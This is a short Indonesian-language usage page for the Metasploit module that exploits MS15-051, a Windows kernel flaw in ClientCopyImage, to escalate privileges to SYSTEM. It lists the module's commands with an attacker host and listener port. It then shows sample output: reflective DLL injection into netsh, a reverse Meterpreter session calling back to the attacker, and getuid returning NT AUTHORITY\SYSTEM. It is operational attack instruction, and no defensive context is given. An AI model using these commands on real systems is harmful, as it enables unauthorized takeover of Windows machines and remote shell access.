# ms15_051_client_copy_image

Modul `ms15_051_client_copy_image` di Metasploit adalah modul `exploit local` untuk sistem Windows yang memanfaatkan kerentanan dalam fungsi `ClientCopyImage` pada kernel (`MS15-051`), memungkinkan eskalasi hak akses ke `SYSTEM` dengan menyalahgunakan pengelolaan objek `GDI` secara tidak benar.

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms15_051_client_copy_image
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] win32k.sys file version: 6.1.7601.17514 branch: 17
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 5688 launched.
[*] Reflectively injecting the DLL into 5688...
[*] Sending stage (177734 bytes) to 192.168.1.53
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 16 opened (192.168.1.11:4444 -> 192.168.1.53:49172) at 2025-05-17 06:04:02 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
